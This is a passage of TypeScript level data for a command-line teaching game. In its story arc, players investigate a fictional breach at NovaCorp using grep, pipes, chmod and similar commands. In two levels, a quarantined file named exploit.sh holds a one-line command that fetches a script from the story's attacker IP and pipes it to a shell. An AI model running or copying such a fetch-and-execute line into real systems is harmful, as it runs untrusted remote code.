import type { Level } from '@cli-quest/shared';

export const ghostLevels: Level[] = [
  // Chapter 1: Orientation
  {
    id: 'ghost-1-1',
    arcId: 'ghost',
    chapter: 1,
    position: 1,
    title: 'First Day',
    objective: 'Navigate to the servers directory and list its contents',
    briefing:
      "Welcome to NovaCorp, the world's leading cloud infrastructure company. You're the newest member of the security team. Your workstation is ready — let's get you oriented.",
    dialogue: [
      {
        character: 'Kai',
        message:
          "Hey, welcome aboard! I'm Kai, your mentor. Let's start by checking out the server directory. Use `cd servers` to navigate there, then `ls` to see what's inside.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'welcome.txt',
                  content:
                    'Welcome to NovaCorp Security Team!\nYour access level: Junior Analyst\nTeam Lead: Kai Chen\n\nPlease review the servers directory for your first assignment.',
                },
                {
                  type: 'directory',
                  name: 'servers',
                  children: [
                    { type: 'file', name: 'web-01.log', content: '[OK] web-01 healthy\nUptime: 47 days' },
                    { type: 'file', name: 'web-02.log', content: '[OK] web-02 healthy\nUptime: 47 days' },
                    { type: 'file', name: 'db-01.log', content: '[OK] db-01 healthy\nUptime: 120 days' },
                    { type: 'file', name: 'api-gateway.log', content: '[WARN] api-gateway\nUnusual traffic spike at 03:47' },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `cd servers` to change to the servers directory' },
      { text: 'Then use `ls` to list the files there' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'currentPath', path: '/home/user/servers' },
        { type: 'commandUsed', command: 'ls' },
      ],
    },
    xpReward: 50,
    commandsIntroduced: ['cd', 'ls'],
  },
  {
    id: 'ghost-1-2',
    arcId: 'ghost',
    chapter: 1,
    position: 2,
    title: 'Reading the Logs',
    objective: 'Read the api-gateway.log file to find the warning',
    briefing:
      'Something caught your eye in the server list. One of the logs has a warning status.',
    dialogue: [
      {
        character: 'Kai',
        message:
          "Good eye noticing the server list. That api-gateway looks suspicious. Use `cat` to read the log file and see what's going on.",
        trigger: { type: 'levelStart' },
      },
      {
        character: 'ARIA',
        message:
          "I'm ARIA, NovaCorp's AI assistant. I've flagged the api-gateway for unusual activity. The log should tell you more.",
        trigger: { type: 'commandExecuted', command: 'cat' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'directory',
                  name: 'servers',
                  children: [
                    { type: 'file', name: 'web-01.log', content: '[OK] web-01 healthy\nUptime: 47 days' },
                    { type: 'file', name: 'web-02.log', content: '[OK] web-02 healthy\nUptime: 47 days' },
                    { type: 'file', name: 'db-01.log', content: '[OK] db-01 healthy\nUptime: 120 days' },
                    {
                      type: 'file',
                      name: 'api-gateway.log',
                      content:
                        '[WARN] api-gateway status report\nTimestamp: 2024-03-15 03:47:22\nAnomaly detected: Unusual traffic spike\nSource: Unknown external IP\nRequests: 14,847 in 60 seconds\nPattern: Sequential endpoint probing\nAction required: Investigate immediately',
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user/servers',
    hints: [
      { text: 'Use `cat api-gateway.log` to read the file' },
      { text: 'The file is in your current directory' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'cat' },
        { type: 'outputContains', substring: 'Anomaly detected' },
      ],
    },
    xpReward: 50,
    commandsIntroduced: ['cat'],
  },
  {
    id: 'ghost-1-3',
    arcId: 'ghost',
    chapter: 1,
    position: 3,
    title: 'Where Am I?',
    objective: 'Use pwd to confirm your location, then navigate up to /home/user',
    briefing: "Let's make sure you know exactly where you are in the system.",
    dialogue: [
      {
        character: 'Kai',
        message:
          'Good practice to always know where you are. Use `pwd` to print your working directory, then `cd ..` to go up one level.',
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                { type: 'file', name: 'notes.txt', content: 'Remember to check the access logs' },
                {
                  type: 'directory',
                  name: 'servers',
                  children: [
                    { type: 'file', name: 'status.txt', content: 'All systems nominal' },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user/servers',
    hints: [
      { text: 'Use `pwd` to see your current directory' },
      { text: 'Use `cd ..` to go up one directory' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'pwd' },
        { type: 'currentPath', path: '/home/user' },
      ],
    },
    xpReward: 50,
    commandsIntroduced: ['pwd'],
  },
  {
    id: 'ghost-1-4',
    arcId: 'ghost',
    chapter: 1,
    position: 4,
    title: 'Creating Evidence',
    objective: 'Create a directory called "investigation" and a file called "notes.txt" inside it',
    briefing:
      "We need to start documenting what we find. Create a workspace for your investigation.",
    dialogue: [
      {
        character: 'Kai',
        message:
          "Create a directory called `investigation` with `mkdir`, then create a notes file inside with `touch`. We'll use this to track our findings.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                { type: 'file', name: 'welcome.txt', content: 'Welcome to NovaCorp' },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `mkdir investigation` to create the directory' },
      { text: 'Use `touch investigation/notes.txt` to create the file' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileExists', path: '/home/user/investigation/notes.txt' },
        { type: 'commandUsed', command: 'mkdir' },
        { type: 'commandUsed', command: 'touch' },
      ],
    },
    xpReward: 75,
    commandsIntroduced: ['mkdir', 'touch'],
  },
  {
    id: 'ghost-1-5',
    arcId: 'ghost',
    chapter: 1,
    position: 5,
    title: 'Cleaning Up',
    objective: 'Remove the temp directory and its contents',
    briefing:
      'Someone left a mess of temporary files on the server. Clean them up.',
    dialogue: [
      {
        character: 'Reeves',
        message:
          "Hey, I'm Reeves, the sysadmin. Someone dumped temp files everywhere. Can you clean up the `temp` directory? Use `rm -r` to remove it and everything inside.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'directory',
                  name: 'temp',
                  children: [
                    { type: 'file', name: 'junk1.tmp', content: 'temp data' },
                    { type: 'file', name: 'junk2.tmp', content: 'more temp data' },
                    { type: 'file', name: 'cache.dat', content: 'cached stuff' },
                  ],
                },
                { type: 'file', name: 'important.txt', content: 'Do not delete this!' },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `rm -r temp` to remove the directory and all its contents' },
      { text: "Make sure you don't delete important.txt!" },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileNotExists', path: '/home/user/temp' },
        { type: 'fileExists', path: '/home/user/important.txt' },
        { type: 'commandUsed', command: 'rm' },
      ],
    },
    xpReward: 75,
    commandsIntroduced: ['rm'],
  },

  // ============================================
  // Chapter 2: The Trail
  // Teaches: grep, find, head, tail, wc, pipes
  // ============================================
  {
    id: 'ghost-2-1',
    arcId: 'ghost',
    chapter: 2,
    position: 1,
    title: 'Searching the Logs',
    objective: 'Use grep to find all lines containing "WARN" in the access log',
    briefing:
      "The api-gateway anomaly needs investigation. Kai has pulled the full access logs. Time to search for warning signs.",
    dialogue: [
      {
        character: 'Kai',
        message:
          "I've dumped the full access logs into your workspace. There are hundreds of lines — we need to filter them. Use `grep \"WARN\" access.log` to find the warnings.",
        trigger: { type: 'levelStart' },
      },
      {
        character: 'ARIA',
        message:
          'I count 4 warning entries in that log. Each one corresponds to a different anomalous event.',
        trigger: { type: 'commandExecuted', command: 'grep' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'access.log',
                  content:
                    '[INFO] 2024-03-15 01:00:00 Normal traffic pattern\n[INFO] 2024-03-15 01:15:00 User login: admin\n[INFO] 2024-03-15 02:00:00 Backup completed\n[WARN] 2024-03-15 03:22:00 Failed login attempt from 192.168.1.99\n[INFO] 2024-03-15 03:30:00 Normal traffic pattern\n[WARN] 2024-03-15 03:47:00 Traffic spike detected - api-gateway\n[INFO] 2024-03-15 04:00:00 Scheduled maintenance check\n[WARN] 2024-03-15 04:12:00 Unauthorized access attempt on /admin\n[INFO] 2024-03-15 04:30:00 Normal traffic pattern\n[INFO] 2024-03-15 05:00:00 System health check passed\n[WARN] 2024-03-15 05:15:00 Unusual outbound connection to 10.0.0.42\n[INFO] 2024-03-15 06:00:00 Morning shift handoff',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `grep "WARN" access.log` to search for warning lines' },
      { text: 'grep searches for a pattern in a file and shows matching lines' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'grep' },
        { type: 'outputContains', substring: 'Traffic spike detected' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['grep'],
  },
  {
    id: 'ghost-2-2',
    arcId: 'ghost',
    chapter: 2,
    position: 2,
    title: 'Case Insensitive',
    objective: 'Find all lines mentioning "error" in any case (upper or lower) in system.log',
    briefing:
      'The system logs use inconsistent casing. Some say ERROR, some say Error, some say error.',
    dialogue: [
      {
        character: 'Kai',
        message:
          'The system logs are messy — different services use different casing for errors. Use `grep -i "error" system.log` to find them all regardless of case.',
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'system.log',
                  content:
                    'Starting services...\nDatabase connection: OK\nERROR: Failed to load module auth-v2\nCache warming complete\nError: Config file missing for worker-3\nAPI gateway initialized\nAll endpoints registered\nerror connecting to telemetry service\nHealth check: passed\nScheduled tasks loaded',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use the -i flag for case-insensitive search: `grep -i "error" system.log`' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'grep' },
        { type: 'outputContains', substring: 'Failed to load module' },
        { type: 'outputContains', substring: 'Config file missing' },
        { type: 'outputContains', substring: 'telemetry service' },
      ],
    },
    xpReward: 100,
  },
  {
    id: 'ghost-2-3',
    arcId: 'ghost',
    chapter: 2,
    position: 3,
    title: 'Finding the Files',
    objective: 'Use find to locate all .log files in the system',
    briefing:
      "Logs are scattered across multiple directories. We need to find them all.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "Logs are spread across multiple server directories. Use `find . -name \"*.log\"` to locate all log files from your current position.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'directory',
                  name: 'servers',
                  children: [
                    {
                      type: 'directory',
                      name: 'web',
                      children: [
                        { type: 'file', name: 'access.log', content: 'web access entries' },
                        { type: 'file', name: 'config.yml', content: 'port: 8080' },
                      ],
                    },
                    {
                      type: 'directory',
                      name: 'api',
                      children: [
                        { type: 'file', name: 'gateway.log', content: 'api gateway entries' },
                        { type: 'file', name: 'routes.json', content: '{}' },
                      ],
                    },
                    {
                      type: 'directory',
                      name: 'db',
                      children: [
                        { type: 'file', name: 'query.log', content: 'database query log' },
                        { type: 'file', name: 'schema.sql', content: 'CREATE TABLE...' },
                      ],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `find . -name "*.log"` to find all files ending in .log' },
      { text: 'The `.` means search from the current directory' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'find' },
        { type: 'outputContains', substring: 'access.log' },
        { type: 'outputContains', substring: 'gateway.log' },
        { type: 'outputContains', substring: 'query.log' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['find'],
  },
  {
    id: 'ghost-2-4',
    arcId: 'ghost',
    chapter: 2,
    position: 4,
    title: 'Reading the Headlines',
    objective: 'Use head to see the first 5 lines of the long incident report',
    briefing:
      'Reeves sent over a massive incident report. Start by skimming the top.',
    dialogue: [
      {
        character: 'Reeves',
        message:
          "I wrote up everything I know about the anomaly. It's a long file. Use `head -n 5 incident-report.txt` to read just the beginning.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'incident-report.txt',
                  content:
                    'INCIDENT REPORT #2024-0315\nDate: March 15, 2024\nSeverity: HIGH\nReporter: Reeves, Systems Administrator\nSummary: Unauthorized access attempt via api-gateway\n\nTimeline:\n03:22 - First failed login attempt detected\n03:47 - Traffic spike on api-gateway (14,847 requests/min)\n04:12 - Unauthorized access attempt on /admin endpoint\n04:30 - Attacker appeared to pause activity\n05:15 - Unusual outbound connection to 10.0.0.42 detected\n05:30 - Connection terminated, no data exfiltration confirmed\n\nAffected Systems:\n- api-gateway (primary target)\n- auth-service (credential probing)\n- db-01 (query anomalies)\n\nRecommendations:\n1. Rotate all API keys immediately\n2. Block IP range 10.0.0.x at firewall\n3. Audit all admin access for past 72 hours\n4. Enable enhanced logging on api-gateway',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `head -n 5 incident-report.txt` to see the first 5 lines' },
      { text: 'The -n flag specifies how many lines to show' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'head' },
        { type: 'outputContains', substring: 'INCIDENT REPORT' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['head'],
  },
  {
    id: 'ghost-2-5',
    arcId: 'ghost',
    chapter: 2,
    position: 5,
    title: 'The Bottom Line',
    objective: 'Use tail to see the last 4 lines of the incident report (the recommendations)',
    briefing:
      "We need the action items from the bottom of the report. No time to read the whole thing.",
    dialogue: [
      {
        character: 'Kai',
        message:
          "Skip to the end — the recommendations are what matter right now. Use `tail -n 4` to see the last 4 lines.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'incident-report.txt',
                  content:
                    'INCIDENT REPORT #2024-0315\nDate: March 15, 2024\nSeverity: HIGH\nReporter: Reeves\nSummary: Unauthorized access attempt\n\nTimeline:\n03:22 - First failed login\n03:47 - Traffic spike\n04:12 - Admin access attempt\n05:15 - Outbound connection\n\nRecommendations:\n1. Rotate all API keys immediately\n2. Block IP range 10.0.0.x at firewall\n3. Audit all admin access for past 72 hours\n4. Enable enhanced logging on api-gateway',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `tail -n 4 incident-report.txt` to see the last 4 lines' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'tail' },
        { type: 'outputContains', substring: 'Rotate all API keys' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['tail'],
  },
  {
    id: 'ghost-2-6',
    arcId: 'ghost',
    chapter: 2,
    position: 6,
    title: 'Counting the Evidence',
    objective: 'Count how many lines are in the access log using wc',
    briefing:
      "We need to quantify the attack. How many log entries are there?",
    dialogue: [
      {
        character: 'ARIA',
        message:
          'Use `wc -l access.log` to count the number of lines. This tells us the volume of activity during the incident window.',
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'access.log',
                  content:
                    '192.168.1.1 GET /api/health 200\n192.168.1.1 GET /api/users 200\n10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n192.168.1.1 GET /api/dashboard 200\n10.0.0.42 GET /admin 403\n10.0.0.42 GET /admin/config 403\n10.0.0.42 GET /admin/users 403\n192.168.1.1 GET /api/health 200\n10.0.0.42 POST /api/upload 403\n192.168.1.1 GET /api/reports 200',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `wc -l access.log` to count lines' },
      { text: 'The -l flag means "lines only"' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'wc' },
        { type: 'outputContains', substring: '12' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['wc'],
  },
  {
    id: 'ghost-2-7',
    arcId: 'ghost',
    chapter: 2,
    position: 7,
    title: 'Your First Pipe',
    objective: 'Use a pipe to grep for "403" in the access log, then count the results with wc',
    briefing:
      "We need to know exactly how many forbidden access attempts there were. Time to combine commands.",
    dialogue: [
      {
        character: 'Kai',
        message:
          "Here's where it gets powerful. You can chain commands with a pipe `|`. The output of one command feeds into the next. Try `grep \"403\" access.log | wc -l` to count forbidden requests.",
        trigger: { type: 'levelStart' },
      },
      {
        character: 'ARIA',
        message:
          '4 forbidden requests — all from the same IP. This is a targeted probe, not random traffic.',
        trigger: { type: 'commandExecuted', command: 'wc' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'access.log',
                  content:
                    '192.168.1.1 GET /api/health 200\n192.168.1.1 GET /api/users 200\n10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n192.168.1.1 GET /api/dashboard 200\n10.0.0.42 GET /admin 403\n10.0.0.42 GET /admin/config 403\n10.0.0.42 GET /admin/users 403\n192.168.1.1 GET /api/health 200\n10.0.0.42 POST /api/upload 403\n192.168.1.1 GET /api/reports 200',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `grep "403" access.log | wc -l` — the pipe sends grep output to wc' },
      { text: 'The | character connects commands: left side outputs, right side receives' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'grep' },
        { type: 'commandUsed', command: 'wc' },
        { type: 'outputContains', substring: '4' },
      ],
    },
    xpReward: 150,
    par: 1,
  },
  {
    id: 'ghost-2-8',
    arcId: 'ghost',
    chapter: 2,
    position: 8,
    title: 'The Trail Goes Cold',
    objective: 'Find the attacker IP by grep-ing for "403" then sort the results to see the pattern',
    briefing:
      "Kai hasn't responded in hours. Something is wrong. You need to trace the attacker's path on your own.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "Kai's last message was 3 hours ago. I can't reach him. We need to continue the investigation. Use `grep \"403\" access.log | sort` to sort the forbidden requests and look for patterns.",
        trigger: { type: 'levelStart' },
      },
      {
        character: 'ARIA',
        message:
          "All forbidden requests from 10.0.0.42. That's an internal IP — this isn't an outside attack. Someone inside NovaCorp is behind this.",
        trigger: { type: 'commandExecuted', command: 'sort' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'access.log',
                  content:
                    '192.168.1.1 GET /api/health 200\n192.168.1.1 GET /api/users 200\n10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n10.0.0.42 POST /api/login 401\n192.168.1.1 GET /api/dashboard 200\n10.0.0.42 GET /admin 403\n10.0.0.42 GET /admin/config 403\n10.0.0.42 GET /admin/users 403\n192.168.1.1 GET /api/health 200\n10.0.0.42 POST /api/upload 403\n192.168.1.1 GET /api/reports 200',
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `grep "403" access.log | sort` to find and sort forbidden requests' },
      { text: 'Look at the IP addresses — are they all the same?' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'grep' },
        { type: 'commandUsed', command: 'sort' },
      ],
    },
    xpReward: 150,
    commandsIntroduced: ['sort'],
  },

  // ============================================
  // Chapter 3: Containment
  // Teaches: mv, cp, chmod, redirection (>, >>)
  // ============================================
  {
    id: 'ghost-3-1',
    arcId: 'ghost',
    chapter: 3,
    position: 1,
    title: 'Quarantine',
    objective: 'Move the suspicious script to the quarantine directory',
    briefing:
      "ARIA found a suspicious script on the api-gateway server. We need to isolate it before it can do any more damage.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "I've identified a suspicious file: `exploit.sh` in the server directory. Move it to `quarantine/` using `mv` before it can be executed again.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'directory',
                  name: 'server',
                  children: [
                    { type: 'file', name: 'exploit.sh', content: '#!/bin/bash\ncurl -s http://10.0.0.42/exfil | sh' },
                    { type: 'file', name: 'config.yml', content: 'port: 443\nssl: true' },
                  ],
                },
                {
                  type: 'directory',
                  name: 'quarantine',
                  children: [],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `mv server/exploit.sh quarantine/exploit.sh` to move the file' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileExists', path: '/home/user/quarantine/exploit.sh' },
        { type: 'fileNotExists', path: '/home/user/server/exploit.sh' },
        { type: 'commandUsed', command: 'mv' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['mv'],
  },
  {
    id: 'ghost-3-2',
    arcId: 'ghost',
    chapter: 3,
    position: 2,
    title: 'Backup the Evidence',
    objective: 'Copy the access log to the evidence directory for safekeeping',
    briefing:
      "Before we go any further, we need to preserve the evidence. Make a copy of the logs.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "If the attacker is inside NovaCorp, they might try to delete the logs. Copy `access.log` to the `evidence/` directory using `cp` so we have a backup.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                { type: 'file', name: 'access.log', content: '10.0.0.42 GET /admin 403\n10.0.0.42 GET /admin/config 403' },
                {
                  type: 'directory',
                  name: 'evidence',
                  children: [],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `cp access.log evidence/access.log` to copy the file' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileExists', path: '/home/user/evidence/access.log' },
        { type: 'fileExists', path: '/home/user/access.log' },
        { type: 'commandUsed', command: 'cp' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['cp'],
  },
  {
    id: 'ghost-3-3',
    arcId: 'ghost',
    chapter: 3,
    position: 3,
    title: 'Locking It Down',
    objective: 'Change the permissions on exploit.sh to remove execute permission',
    briefing:
      "The quarantined script still has execute permissions. Lock it down.",
    dialogue: [
      {
        character: 'Reeves',
        message:
          "That exploit script can still be executed. Use `chmod 444 quarantine/exploit.sh` to make it read-only. Nobody should be able to run it.",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'directory',
                  name: 'quarantine',
                  children: [
                    { type: 'file', name: 'exploit.sh', content: '#!/bin/bash\ncurl -s http://10.0.0.42/exfil | sh', permissions: 'rwxr-xr-x' },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `chmod 444 quarantine/exploit.sh` to make it read-only' },
      { text: '444 means read-only for everyone, no write or execute' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'commandUsed', command: 'chmod' },
      ],
    },
    xpReward: 100,
    commandsIntroduced: ['chmod'],
  },
  {
    id: 'ghost-3-4',
    arcId: 'ghost',
    chapter: 3,
    position: 4,
    title: 'Writing the Report',
    objective: 'Use echo with redirect to write "COMPROMISED: api-gateway" to a report file',
    briefing:
      "We need to start documenting compromised systems. Write findings to a file.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          'Use output redirection to write to a file. Try `echo "COMPROMISED: api-gateway" > report.txt` — the `>` operator creates a file with the output.',
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                { type: 'file', name: 'notes.txt', content: 'Investigation in progress' },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `echo "COMPROMISED: api-gateway" > report.txt` to write to a file' },
      { text: 'The > operator redirects command output into a file' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileExists', path: '/home/user/report.txt' },
        { type: 'fileContains', path: '/home/user/report.txt', substring: 'COMPROMISED: api-gateway' },
      ],
    },
    xpReward: 125,
  },
  {
    id: 'ghost-3-5',
    arcId: 'ghost',
    chapter: 3,
    position: 5,
    title: 'Appending Evidence',
    objective: 'Append "COMPROMISED: auth-service" to the existing report file using >>',
    briefing:
      "Another compromised system found. Add it to the report without overwriting what's there.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "I've confirmed auth-service was also compromised. Use `>>` to append to the report without overwriting it: `echo \"COMPROMISED: auth-service\" >> report.txt`",
        trigger: { type: 'levelStart' },
      },
      {
        character: 'ARIA',
        message:
          'Good. Two systems confirmed compromised. We need to find out how the attacker got in.',
        trigger: { type: 'commandExecuted', command: 'echo' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                { type: 'file', name: 'report.txt', content: 'COMPROMISED: api-gateway' },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `echo "COMPROMISED: auth-service" >> report.txt` — note the >> for append' },
      { text: '> overwrites, >> appends to the end' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'fileContains', path: '/home/user/report.txt', substring: 'COMPROMISED: api-gateway' },
        { type: 'fileContains', path: '/home/user/report.txt', substring: 'COMPROMISED: auth-service' },
      ],
    },
    xpReward: 125,
  },

  // ============================================
  // Chapter 4: The Truth
  // Teaches: complex pipes, env vars, multi-step
  // ============================================
  {
    id: 'ghost-4-1',
    arcId: 'ghost',
    chapter: 4,
    position: 1,
    title: 'Environment Secrets',
    objective: 'Set an environment variable SUSPECT_IP to "10.0.0.42" and echo it',
    briefing:
      "We keep typing the attacker's IP. Let's store it in a variable for easy reference.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          'Environment variables let you store values for reuse. Use `export SUSPECT_IP=10.0.0.42` then `echo $SUSPECT_IP` to verify it.',
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                { type: 'file', name: 'case-notes.txt', content: 'Suspect IP: 10.0.0.42\nFirst seen: 03:22\nLast seen: 05:30' },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Use `export SUSPECT_IP=10.0.0.42` to set the variable' },
      { text: 'Then use `echo $SUSPECT_IP` to print its value' },
    ],
    validator: {
      type: 'all',
      conditions: [
        { type: 'envVar', name: 'SUSPECT_IP', value: '10.0.0.42' },
        { type: 'commandUsed', command: 'export' },
        { type: 'commandUsed', command: 'echo' },
      ],
    },
    xpReward: 125,
    commandsIntroduced: ['export'],
  },
  {
    id: 'ghost-4-2',
    arcId: 'ghost',
    chapter: 4,
    position: 2,
    title: 'The Full Picture',
    objective: 'Grep for the suspect IP in the access log, sort the results, and save them to evidence/suspect-activity.txt',
    briefing:
      "Time to compile everything we know about the attacker into one clean evidence file.",
    dialogue: [
      {
        character: 'ARIA',
        message:
          "Combine everything you've learned. Grep for the suspect IP, sort the results, and redirect the output to a file. One command: `grep \"10.0.0.42\" access.log | sort > evidence/suspect-activity.txt`",
        trigger: { type: 'levelStart' },
      },
    ],
    initialFS: {
      type: 'directory',
      name: '',
      children: [
        {
          type: 'directory',
          name: 'home',
          children: [
            {
              type: 'directory',
              name: 'user',
              children: [
                {
                  type: 'file',
                  name: 'access.log',
                  content:
                    '192.168.1.1 GET /api/health 200\n10.0.0.42 POST /api/login 401\n192.168.1.1 GET /api/users 200\n10.0.0.42 POST /api/login 401\n10.0.0.42 GET /admin 403\n192.168.1.1 GET /api/dashboard 200\n10.0.0.42 GET /admin/config 403\n10.0.0.42 POST /api/upload 403\n192.168.1.1 GET /api/health 200\n10.0.0.42 GET /admin/users 403',
                },
                {
                  type: 'directory',
                  name: 'evidence',
                  children: [],
                },
              ],
            },
          ],
        },
      ],
    },
    startingPath: '/home/user',
    hints: [
      { text: 'Combine grep, sort, and redirect: `grep "10.0.0.42" access.log | sort > evidence/suspect-activity.txt`' },
